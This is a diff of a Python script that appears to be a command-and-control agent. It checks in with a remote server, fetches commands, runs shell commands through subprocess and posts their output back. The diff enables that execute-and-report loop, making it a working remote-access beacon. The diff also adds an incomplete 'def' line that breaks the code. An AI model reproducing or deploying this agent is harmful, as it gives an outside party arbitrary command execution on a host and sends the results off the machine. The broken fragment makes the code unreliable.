@@ -24,26 +24,29 @@ def register(aName):
     return response.json()['id']
 def get_command(aId):
     response= requests.get(ServerUrl+"api/checkin/"+str(aId)+"/")
+    print(response.content)
     return response.json()
 def execute_command(data):
     if data['CommandType']=='FileTransfer':
         print("file transfer")
     if data['CommandType']=='ShellCommand':
         return subprocess.check_output(data['Command'].split(' '))
+
+def 
 # def Upload_file(data):
 
 def report_output(output,command_id):
     data={'output':output,'id': command_id }
     requests.post(ServerUrl+"api/agentreportoutput/",data=data)
 #agent_id=register(AgentName)
-#print(self_id)
-print( register(AgentName))
-
-# json_data= get_command(24)
-# output=execute_command(json_data)
-# print(output)
-# print(json_data['id'])
-# report_output(output,json_data['id'])
+#print(agent_id)
+agent_id=1
+#print( register(AgentName))
+json_data= get_command(agent_id)
+output=execute_command(json_data)
+print(output)
+print(json_data['id'])
+report_output(output,json_data['id'])
 
 
 def fake():
